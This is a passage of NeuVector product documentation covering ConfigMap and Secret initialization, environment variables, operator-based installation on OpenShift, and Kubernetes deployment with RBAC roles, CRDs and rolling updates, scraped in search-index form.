custom-admin1 - custom-admin2 group_claim: groups sysinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false # Optional. Choose between Discover or Monitor or Protect or empty string(Discover) New_Service_Policy_Mode: Discover # Optional. zero-drift or basic or empty string(zero-drift) New_Service_Profile_Baseline: zero-drift # Optional. input valid ipv4 address or empty string Syslog_ip: 1.2.3.4 # Optional. input 17, 6 or 66 here for udp, tcp, tcp+tls or empty string(17) Syslog_IP_Proto: 17 # Optional. it is required when Syslog_IP_Proto is 66 only Syslog_Server_Cert: | -----BEGIN CERTIFICATE----- MIIC8DCCAdigAwIBAgIQSMNDFv5HI7RPgF0uHW8YJDANBgkqhkiG9w0BAQsFADA0MTIwMAYDVQQD ... -----END CERTIFICATE----- # Optional. empty string(514) Syslog_Port: 514 # Optional. chose between Alert/Critical/Error/Warning/Notice/Info/Debug or empty string(Info) Syslog_Level: Info # Optional. true or false or empty string(false) Syslog_status: false Syslog_Categories: # Optional. can chose multiple between event/security-event/audit or empty string - event - security-event - audit Syslog_in_json: # Optional. true, false, empty, unconfigured. # true = In Json: checkbox enabled from Settings &gt; Configuration &gt; Syslog # false, empty, unconfigured = In Json: checkbox disabled from Settings &gt; Configuration &gt; Syslog # # Optional. true or false or empty string(false) Auth_By_Platform: false single_cve_per_syslog: false syslog_cve_in_layers: false # Optional Webhooks: - name: myslack url: http... type: Slack enable: true - name: mywebhook url: http... enable: true # Optional. empty string Cluster_Name: cluster.local # Optional. chose multiple between cpath/mutex/conn/scan/cluster or empty string Controller_Debug: - cpath # Optional. true or false or empty string(true) Monitor_Service_Mesh: true # Optional. true or false or empty string(false) Registry_Http_Proxy_Status: false # Optional. true or false or empty string(false) Registry_Https_Proxy_Status: false # Optional. http/https registry proxy or empty string Registry_Http_Proxy: URL: http... Username: username Password: password Registry_Https_Proxy: URL: https... Username: username Password: password Xff_Enabled: true Net_Service_Status: false Net_Service_Policy_Mode: Discover Scanner_Autoscale: # Optional. Choose between immediate or delayed or empty string Strategy: Min_Pods: 1 Max_Pods: 3 # Optional. true or false or empty string(false) No_Telemetry_Report: false Scan_Config: # Optional. true or false or empty string(false) Auto_Scan: false # Optional. default value is 24. unit is hour and range is between 0 and 168 Unused_Group_Aging: 24 userinitcfg.yaml: | # Optional. true or false or empty string(false) always_reload: false users: # add multiple users below - # this user will be added # Optional. EMail: user1@email.com # Mandatory. username can have ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$ Fullname: user1 # Optional. en or zh_cn or empty string(en) Locale: en # Optional. password length minimal 6, don't lead with ]`}*|&lt;&gt;!% Password: password # Optional. admin or reader or empty string(none) Role: reader # Optional. admin group or reader group or empty string Role_Domains: admin: - admin1 - admin2 reader: - reader1 - reader2 # Optional. value between 30 -- 3600 default 300 Timeout: 300 - # this user will overwrite the original admin user Fullname: admin Password: password Role: admin kind: ConfigMap metadata: name: neuvector-init namespace: neuvector   Then create the ConfigMap object:  kubectl create -f initcfg.yaml   ","version":"Next 🚧","tagName":"h3"},{"title":"Protect Sensitive Data Using a Secret​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/next/deploying/production/configmap#protect-sensitive-data-using-a-secret","content":" If sensitive data is to be included in some sections of the configmap, a secret can be created for those sections with sensitive data.  For example, create the configMap for NON-sensitive sections such as passwordProfile and role:  kubectl create configmap neuvector-init --from-file=$HOME/init/passwordprofileinitcfg.yaml --from-file=$HOME/init/roleinitcfg.yaml -n neuvector   Then create a secret for sections with sensitive data, such as:  kubectl create secret generic neuvector-init --from-file=$HOME/init/eulainitcfg.yaml --from-file=$HOME/init/ldapinitcfg.yaml --from-file=$HOME/init/oidcinitcfg.yaml --from-file=$HOME/init/samlinitcfg.yaml --from-file=$HOME/init/sysinitcfg.yaml --from-file=$HOME/init/userinitcfg.yaml -n neuvector   important Remove the the pipe '|' character in each section, as shown below.  Note the removal of the pipe character below if using configmap sections in a secret, enabled set to true, and uncomment out the section to be included in the secret.  secret: # NOTE: files defined here have preferrence over the ones defined in the configmap section enabled: true data: eulainitcfg.yaml: license_key: 0Bca63Iy2FiXGqjk... # ... # ldapinitcfg.yaml: # directory: OpenLDAP # ... # oidcinitcfg.yaml: # Issuer: https://... # ... # samlinitcfg.yaml: # ... # sysinitcfg.yaml: # ... # userinitcfg.yaml: # ...   After controller is deployed, all the configuration files from both configmap and secret will be stored in /etc/config folder.  Note that the secret is referred to in the standard Kubernetes and OpenShift Controller deployment yaml files under Volumes.  ","version":"Next 🚧","tagName":"h3"},{"title":"ConfigMaps and Persistent Storage​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/next/deploying/production/configmap#configmaps-and-persistent-storage","content":" Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage. ","version":"Next 🚧","tagName":"h3"},{"title":"Environment Variables Details","type":0,"sectionRef":"#","url":"/next/deploying/production/details","content":"","keywords":"","version":"Next 🚧"},{"title":"Environment Variables​","type":1,"pageTitle":"Environment Variables Details","url":"/next/deploying/production/details#environment-variables","content":" For Both Controller (Allinone) and Enforcer​  CLUSTER_JOIN_ADDR  Set the variable to the host IP for the first controller; and set it to the master controller's host IP for other controllers and enforcers. It’s not necessary to set this IP for Kubernetes based deployments, just use the sample file.  CLUSTER_LAN_PORT  (Optional) Cluster Serf LAN port. Both TCP and UDP ports must be mapped to the host directly. Optional if there is no port conflict on the host. Default 18301  DOCKER_URL  (Optional) If the docker engine on the host does not bind on the normal Unix socket, use this variable to specify the TCP connection point, in the format of tcp://10.0.0.1:2376.  NV_PLATFORM_INFO  (Optional) Use value platform=Docker for Docker Swarm/EE deployments, or platform=Kubernetes:GKE for GKE (to run GKE CIS Benchmarks).  CUSTOM_CHECK_CONTROL  (Optional) Used to enable/disable ability to create custom compliance scripts in containers/hosts. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).  AUTO_PROFILE_COLLECT  (Optional) Set value to 1 to enable collection of memory profile data to help investigate memory pressure issues.  Controller​  CTRL_PERSIST_CONFIG  (Optional) To backup configuration files and restore them from a persistent volume. Add this to the yaml to enable; remove to disable.  CLUSTER_RPC_PORT  (Optional) Cluster server RPC port. Must be mapped to the host directly. The environment variable is optional if there is no port conflict on the host. Default 18300  CTRL_SERVER_PORT  (Optional) HTTPS port that the REST server should be listening on. Default is 10443. Normally it can be left as default and use docker port option to map the port on the host.  DISABLE_PACKET_CAPTURE  (Optional) Add this to the yaml to disable packet capture; remove to re-enable (default).  NO_DEFAULT_ADMIN  (Optional) When enabled does not create an 'admin' user in the local cluster. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.  CTRL_EN_ICMP_POLICY  (Optional) When enabled (value=1) icmp traffic can be learned in discover mode, and policy can be generated. If there is no network policy in monitor or protect mode for the group, an implicit violation will be generated for icmp traffic.  Manager​  CTRL_SERVER_IP  (Optional for all-in-one) Controller REST server IP address. Default is 127.0.0.1. For all-in-one container, leave it as default. If the Manager is running separately, the Manager must specify this IP to connect to the controller.  CTRL_SERVER_PORT  (Optional for all-in-one) Controller REST server port. Default is 10443. For all-in-one container, leave it as default. If the Manager is running separately, the Manager should specify this variable to connect to the controller.  MANAGER_SERVER_PORT  (Optional) Manager UI port. Default is 8443. Unless the Manager is running in host mode, leave it and user docker port option to map the port on the host.  MANAGER_SSL  (Optional) Manager by default uses and HTTPS/SSL connection. Set the value to “off” to use HTTP.  Enforcer​  CONTAINER_NET_TYPE  (Optional) To support special network plug-in set value to &quot;macvlan”  ENF_NO_SECRET_SCANS  (Optional) Set the value to “1” to disable scanning for secrets in files (improves performance).  ENF_NO_AUTO_BENCHMARK  (Optional) Set the value to “1” to disable CIS benchmarks on host and containers (improves performance).  ENF_NO_SYSTEM_PROFILES  (Optional) Set the value to &quot;1&quot; to disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.  ENF_NETPOLICY_PULL_INTERVAL  (Optional) Value in seconds (recommended value 60) to reduce network traffic and resource consumption by Enforcer due to policy updates/recalculations, in clusters with high node counts or workloads. Default is zero, meaning no delay in updating Enforcer policy.  THRT_SSL_TLS_1DOT0  (Optional) Set the value to “1” to enable the detection for TLS Version 1.0 (Deprecated).  THRT_SSL_TLS_1DOT1  (Optional) Set the value to “1” to enable the detection for TLS Version 1.1 (Deprecated).  NV_SYSTEM_GROUPS  (Optional) Specify what groups or namespaces that NeuVector considers to be 'system containers', separated by semi-colons. For example, for Rancher-based apps and the default namespace, NV_SYSTEM_GROUPS=*cattle-system;*default. These values are translated in regex. System containers (which also include NeuVector and Kubernetes system containers) operate only in Monitor mode (alert only) even if the group is set to Protect mode.  ","version":"Next 🚧","tagName":"h3"},{"title":"Open Ports​","type":1,"pageTitle":"Environment Variables Details","url":"/next/deploying/production/details#open-ports","content":" CLUSTER_RPC_PORT - on controller and all-in-one. Default 18300.CLUSTER_LAN_PORT - on controller, enforcer and all-in-one. Default 18301.MANAGER_SERVER_PORT - on manager or all-in-one. Default 8443.CTRL_SERVER_PORT - on controller. Default 10443.  Please see the section Deployment Preparation for a full description of the port communication requirements for the NeuVector containers. ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy Using Operators","type":0,"sectionRef":"#","url":"/next/deploying/production/operators","content":"","keywords":"","version":"Next 🚧"},{"title":"Operators​","type":1,"pageTitle":"Deploy Using Operators","url":"/next/deploying/production/operators#operators","content":" Operators take human operational knowledge and encode it into software that is more easily shared with consumers. Operators are pieces of software that ease the operational complexity of running another piece of software. More technically, Operators are a method of packaging, deploying, and managing a Kubernetes application.  ","version":"Next 🚧","tagName":"h3"},{"title":"NeuVector Operators​","type":1,"pageTitle":"Deploy Using Operators","url":"/next/deploying/production/operators#neuvector-operators","content":" The NeuVector Operator is based on the NeuVector Helm chart. The NeuVector RedHat OpenShift Operator runs in the OpenShift container platform to deploy and manage the NeuVector Security cluster components. The NeuVector Operator contains all necessary information to deploy NeuVector using Helm charts. You simply need to install the NeuVector operator from the OpenShift embedded Operator hub and create the NeuVector instance.  To deploy the latest NeuVector container versions, please use either the Red Hat Certified Operator from Operator Hub or the community operator. Documentation for the community operator can be found here.  Note about SCC and Upgrading  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged   important NeuVector Certified Operator versions are tied to NeuVector product versions, and each new version must go through a certification process with Red Hat before being published. Certified operator version for 5.3.x is tied to helm version 2.7.2 and NeuVector app version 5.3.0. Certified operator version 1.3.9 is tied to NeuVector version 5.2.0. Certified operator version 1.3.7 is tied to NeuVector version 5.1.0. Version 1.3.4 operator version is tied to NeuVector 5.0.0. If you wish to be able to change the version tags of the NeuVector containers deployed, please use the Community version.  Deploy Using Certified Operator Deploy Using the Red Hat Certified Operator from Operator Hub important NeuVector Operator versions are tied to NeuVector product versions, and each new product version must go through a certification process with Red Hat before being published. Technical notes NeuVector container images are pulled from registry.connect.redhat.com using the RedHat market place image pull secret.The NeuVector manager UI is typically exposed via an OpenShift passthrough route on a domain. For example, on IBM Cloud neuvector-route-webui-neuvector.(cluster_name)-(random_hash)-0000.(region).containers.appdomain.cloud. It can also be exposed as the service neuvector-service-webui through a node port address or public IP.OpenShift version &gt;=4.6. Create the project neuvector. oc new-project neuvector Install the RedHat Certified Operator from the Operator Hub In the OpenShift Console UI, navigate to OperatorHubSearch for NeuVector Operator and select the listing without community or marketplace badgeClick Install Configure update channel Current latest channel is beta, but may be moved to stable in the futureSelect stable if available Configure installation mode and installed namespace Select specific namespace on the clusterSelect neuvector as installed namespaceConfigure approval strategy Confirm Install Prepare the YAML configuration values for the NeuVector installation as shown in the sample screen shot below. The YAML presented in the OpenShift Console provides all available configuration options and their default values. When the operator is installed and ready for use, a NeuVector instance can be installed. Click View operator (after the operator installation) or select the NeuVector Operator from the Installed operators viewClick Create instanceSelect Configure via YAML ViewPaste the prepared YAML configuration valuesClick Create Verify the installation of the NeuVector instance Navigate to the Operator Details of the NeuVector OperatorOpen the NeuVector tabSelect the neuvector-default instanceOpen the Resources tabVerify that resources are in status Created or Running After you have successfully deployed the NeuVector Platform to your cluster, login to the NeuVector console at https://neuvector-route-webui-neuvector.(OC_INGRESS). Login with the initial username admin and password admin.Accept the NeuVector end user license agreement.Change the password of the admin user. Optionally, you can also create additional users in the Settings -&gt; Users &amp; Roles menu. Now you are ready to navigate the NeuVector console to start vulnerability scanning, observe running application pods, and apply security protections to containers. Upgrading NeuVector Upgrade the NeuVector version by updating the Operator version which is associated with the desired NeuVector version.  Deploy Using Community Operator Deploy Using the NeuVector Community Operator from Operator Hub Technical notes NeuVector container images are pulled from Docker Hub from the NeuVector account.NeuVector manager UI is typically exposed via an OpenShift passthrough route on a domain. For example, on IBM Cloud neuvector-route-webui-neuvector.(cluster_name)-(random_hash)-0000.(region).containers.appdomain.cloud. It can also be exposed as the service neuvector-service-webui through a node port address or public IP.OpenShift version 4.6+It is recommendeded to review and modify the NeuVector installation configuration by modifying the yaml values before creating the NeuVector instance. Examples include imagePullSecrets name, tag version, ingress/console access, multi-cluster federation, persistent volume PVC etc. Please refer to the Helm instructions at https://github.com/neuvector/neuvector-helm for the values that can be modified during installation. Create the project neuvector oc new-project neuvector Install the NeuVector Community Operator from the Operator Hub In the OpenShift Console UI, navigate to OperatorHubSearch for NeuVector Operator and select the listing with the community badgeClick InstallConfigure update channel. Current latest channel is beta, but may be moved to stable in the future. Select stable if available.Configure installation mode and installed namespaceSelect specific namespace on the clusterSelect neuvector as installed namespaceConfigure approval strategyConfirm Install Download the Kubernetes secret manifest which contains the credentials to access the NeuVector container registry. Save the YAML manifest file to ./neuvector-secret-registry.yaml. Apply the Kubernetes secret manifest containing the registry credentials. kubectl apply -n neuvector -f ./neuvector-secret-registry.yaml Prepare the YAML configuration values for the NeuVector installation starting from the following YAML snippet. Be sure to specify the desired NeuVector version in the 'tag' value. Check the reference of values in the NeuVector Helm chart to get available configuration options. There are other possible Helm values which can be configured in the YAML, such as whether you will configure the cluster to allow multi-cluster management by exposing the Master (Federated Master) or remote (Federated Worker) services. apiVersion: apm.neuvector.com/v1alpha1 kind: Neuvector metadata: name: neuvector-default namespace: neuvector spec: openshift: true tag: 4.3.0 registry: docker.io exporter: image: repository: prometheus-exporter tag: 0.9.0 manager: enabled: true env: ssl: true image: repository: manager svc: type: ClusterIP route: enabled: true termination: passthrough enforcer: enabled: true image: repository: enforcer cve: updater: enabled: true image: repository: updater tag: latest schedule: 0 0 * * * scanner: enabled: true replicas: 3 image: repository: scanner tag: latest controller: enabled: true image: repository: controller replicas: 3 When the operator is installed and ready for use, a NeuVector instance can be installed. Click View operator (after the operator installation) or select the NeuVector Operator from the Installed operators viewClick Create instanceSelect Configure via YAML ViewPaste the prepared YAML configuration valuesClick Create Verify the installation of the NeuVector instance. Navigate to the Operator Details of the NeuVector OperatorOpen the NeuVector tabSelect the neuvector-default instanceOpen the Resources tabVerify that resources are in status Created or Running After you have successfully deployed the NeuVector Platform to your cluster, login to the NeuVector console at https://neuvector-route-webui-neuvector.(INGRESS_DOMAIN). Login with the initial username admin and password admin.Accept the NeuVector end user license agreement.Change the password of the admin user.Optionally, you can also create additional users in the Settings -&gt; Users &amp; Roles menu. Now you are ready to navigate the NeuVector console to start vulnerability scanning, observe running application pods, and apply security protections to containers. Upgrading NeuVector From Operators &gt; Installed Operators &gt; NeuVector Operator Click on NeuVector to list instances Click on YAML to edit parameters Update tag and click Save  ","version":"Next 🚧","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Deploy Using Operators","url":"/next/deploying/production/operators#troubleshooting","content":" Check the Operator deployment values in the deployed yaml fileVerify that security context constraint (SCC) for NeuVector in step 2 was successfully addedReview and check the NeuVector Helm chart valuesMake sure the registry path and version tag is set properly (community operator; certified will use the defaults)Make sure the route to the NeuVector manager service neuvector-route-webui is configured ","version":"Next 🚧","tagName":"h3"},{"title":"Kubernetes","type":0,"sectionRef":"#","url":"/next/deploying/kubernetes","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy Using Kubernetes​","type":1,"pageTitle":"Kubernetes","url":"/next/deploying/kubernetes#deploy-using-kubernetes","content":" You can use Kubernetes to deploy separate manager, controller and enforcer containers and make sure that all new nodes have an enforcer deployed. NeuVector requires and supports Kubernetes network plugins such as flannel, weave, or calico.  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset. By default, the sample below will deploy to the Master node as well.  See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues. If you plan to use a PersistentVolume claim to store the backup of NeuVector config files, please see the general Backup/Persistent Data section in the Deploying NeuVector overview.  If your deployment supports an integrated load balancer, change type NodePort to LoadBalancer for the console in the yaml file below.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  There is a separate section for OpenShift instructions, and Docker EE on Kubernetes has some special steps described in the Docker section.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.3.2neuvector/controller:5.3.2neuvector/enforcer:5.3.2neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml:  Update the registry to docker.ioUpdate image names/tags to the current version on Docker hub, as shown aboveLeave the imagePullSecrets empty  note If deploying from the Rancher Manager 2.6.5+ NeuVector chart, images are pulled automatically from the Rancher Registry mirrored image repo, and deploys into the cattle-neuvector-system namespace.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy NeuVector​","type":1,"pageTitle":"Kubernetes","url":"/next/deploying/kubernetes#deploy-neuvector","content":" Create the NeuVector namespace and the required service accounts: kubectl create namespace neuvector kubectl create sa controller -n neuvector kubectl create sa enforcer -n neuvector kubectl create sa basic -n neuvector kubectl create sa updater -n neuvector kubectl create sa scanner -n neuvector kubectl create sa registry-adapter -n neuvector (Optional) Create the NeuVector Pod Security Admission (PSA) or Pod Security Policy (PSP). If you have enabled Pod Security Admission (aka Pod Security Standards) in Kubernetes 1.25+, or Pod Security Policies (prior to 1.25) in your Kubernetes cluster, add the following for NeuVector (for example, nv_psp.yaml). Note1: PSP is deprecated in Kubernetes 1.21 and will be totally removed in 1.25. Note2: The Manager and Scanner pods run without a uid. If your PSP has a rule Run As User: Rule: MustRunAsNonRoot then add the following into the sample yaml below (with appropriate value for ###): securityContext: runAsUser: ### For PSA in Kubernetes 1.25+, label the NeuVector namespace with privileged profile for deploying on a PSA enabled cluster. kubectl label namespace neuvector &quot;pod-security.kubernetes.io/enforce=privileged&quot; Create the custom resources (CRD) for NeuVector security rules. For Kubernetes 1.19+: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/com-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/vul-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/admission-crd-k8s-1.19.yaml Add read permission to access the kubernetes API. important The standard NeuVector 5.2+ deployment uses least-privileged service accounts instead of the default. See below if upgrading from a version prior to 5.3. attention If you are upgrading to 5.3.0+, run the following commands based on your current version: Version 5.2.0Versions prior to 5.2.0 kubectl delete clusterrole neuvector-binding-nvsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-nvwafsecurityrules Apply the read permissions via the following &quot;create clusterrole&quot; commands: kubectl create clusterrole neuvector-binding-app --verb=get,list,watch,update --resource=nodes,pods,services,namespaces kubectl create clusterrole neuvector-binding-rbac --verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io kubectl create clusterrolebinding neuvector-binding-app --clusterrole=neuvector-binding-app --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-rbac --clusterrole=neuvector-binding-rbac --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-admission --verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations kubectl create clusterrolebinding neuvector-binding-admission --clusterrole=neuvector-binding-admission --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions kubectl create clusterrolebinding neuvector-binding-customresourcedefinition --clusterrole=neuvector-binding-customresourcedefinition --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvsecurityrules --verb=get,list,delete --resource=nvsecurityrules,nvclustersecurityrules kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=get,list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=get,list,delete --resource=nvdlpsecurityrules kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=get,list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvsecurityrules --clusterrole=neuvector-binding-nvsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:controller kubectl create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector kubectl create rolebinding neuvector-binding-scanner --role=neuvector-binding-scanner --serviceaccount=neuvector:updater --serviceaccount=neuvector:controller -n neuvector kubectl create role neuvector-binding-secret --verb=get --resource=secrets -n neuvector kubectl create rolebinding neuvector-binding-secret --role=neuvector-binding-secret --serviceaccount=neuvector:controller -n neuvector kubectl create clusterrole neuvector-binding-nvcomplianceprofiles --verb=get,list,delete --resource=nvcomplianceprofiles kubectl create clusterrolebinding neuvector-binding-nvcomplianceprofiles --clusterrole=neuvector-binding-nvcomplianceprofiles --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvvulnerabilityprofiles --verb=get,list,delete --resource=nvvulnerabilityprofiles kubectl create clusterrolebinding neuvector-binding-nvvulnerabilityprofiles --clusterrole=neuvector-binding-nvvulnerabilityprofiles --serviceaccount=neuvector:controller Run the following commands to check if the neuvector/controller and neuvector/updater service accounts are added successfully. kubectl get ClusterRoleBinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules -o wide Sample output: NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-app ClusterRole/neuvector-binding-app 56d neuvector/controller neuvector-binding-rbac ClusterRole/neuvector-binding-rbac 34d neuvector/controller neuvector-binding-admission ClusterRole/neuvector-binding-admission 72d neuvector/controller neuvector-binding-customresourcedefinition ClusterRole/neuvector-binding-customresourcedefinition 72d neuvector/controller neuvector-binding-nvsecurityrules ClusterRole/neuvector-binding-nvsecurityrules 72d neuvector/controller neuvector-binding-view ClusterRole/view 72d neuvector/controller neuvector-binding-nvwafsecurityrules ClusterRole/neuvector-binding-nvwafsecurityrules 72d neuvector/controller neuvector-binding-nvadmissioncontrolsecurityrules ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules 72d neuvector/controller neuvector-binding-nvdlpsecurityrules ClusterRole/neuvector-binding-nvdlpsecurityrules 72d neuvector/controller&lt;/code&gt; And this command: kubectl get RoleBinding neuvector-binding-scanner -n neuvector -o wide Sample output: NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-scanner Role/neuvector-binding-scanner 70d neuvector/updater, neuvector/controller (Optional) Create the Federation Master and/or Remote Multi-Cluster Management Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service. For flexibility, you may choose to deploy both Master and Worker services on each cluster so any cluster can be a master or remote. Federated Cluster Management apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-master namespace: neuvector spec: ports: - port: 11443 name: fed protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-worker namespace: neuvector spec: ports: - port: 10443 name: fed protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod Then create the appropriate service(s): kubectl create -f nv_master_worker.yaml Create the primary NeuVector services and pods using the preset version commands or modify the sample yaml below. The preset version invoke a LoadBalancer for the NeuVector Console. If using the sample yaml file below replace the image names and &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment (such as LoadBalancer/NodePort/Ingress for manager access etc). kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/neuvector-k8s.yaml Or, if modifying any of the above yaml or samples from below: kubectl create -f neuvector.yaml That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  note The nodeport service specified in the neuvector.yaml file will open a random port on all kubernetes nodes for the NeuVector management web console port. Alternatively, you can use a LoadBalancer or Ingress, using a public IP and default port 8443. For nodeport, be sure to open access through firewalls for that port, if needed. If you want to see which port is open on the host nodes, please do the following commands: kubectl get svc -n neuvector And you will see something like: NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-webui 10.100.195.99 &lt;nodes&gt; 8443:30257/TCP 15m   PKS Change  note PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock   Master Node Taints and Tolerations  All taint info must match to schedule Enforcers on nodes. To check the taint info on a node (e.g. Master):  $ kubectl get node taintnodename -o yaml   Sample output:  spec: taints: - effect: NoSchedule key: node-role.kubernetes.io/master # there may be an extra info for taint as below - effect: NoSchedule key: mykey value: myvalue   If there is additional taints as above, add these to the sample yaml tolerations section:  spec: template: spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane # if there is an extra info for taints as above, please add it here. This is required to match all the taint info defined on the taint node. Otherwise, the Enforcer won't deploy on the taint node - effect: NoSchedule key: mykey value: myvalue   ","version":"Next 🚧","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"Kubernetes","url":"/next/deploying/kubernetes#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Replace nodename with the appropriate node name (‘kubectl get nodes’). Note: By default Kubernetes will not schedule pods on the master node.  kubectl label nodes nodename nvcontroller=true   Then add a nodeSelector to the yaml file for the Manager and Controller deployment sections. For example:   - mountPath: /host/cgroup name: cgroup-vol readOnly: true nodeSelector: nvcontroller: &quot;true&quot; restartPolicy: Always   To prevent the enforcer from being deployed on a controller node, if it is a dedicated management node (without application containers to be monitored), add a nodeAffinity to the Enforcer yaml section. For example:   app: neuvector-enforcer-pod spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: nvcontroller operator: NotIn values: [&quot;true&quot;] imagePullSecrets:   ","version":"Next 🚧","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"Kubernetes","url":"/next/deploying/kubernetes#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Controller (or Allinone) running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 120 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector. If you are updating via Kubernetes you can manually update to a new version with the sample commands below.  Sample Kubernetes Rolling Update​  For upgrades which just need to update to a new image version, you can use this simple approach.  If your Deployment or Daemonset is already running, you can change the yaml file to the new version, then apply the update:  kubectl apply -f &lt;yaml file&gt;   To update to a new version of NeuVector from the command line.  For controller as Deployment (also do for manager)  kubectl set image deployment/neuvector-controller-pod neuvector-controller-pod=neuvector/controller:2.4.1 -n neuvector   For any container as a DaemonSet:  kubectl set image -n neuvector ds/neuvector-enforcer-pod neuvector-enforcer-pod=neuvector/enforcer:2.4.1   To check the status of the rolling update:  kubectl rollout status -n neuvector ds/neuvector-enforcer-pod kubectl rollout status -n neuvector deployment/neuvector-controller-pod   To rollback the update:  kubectl rollout undo 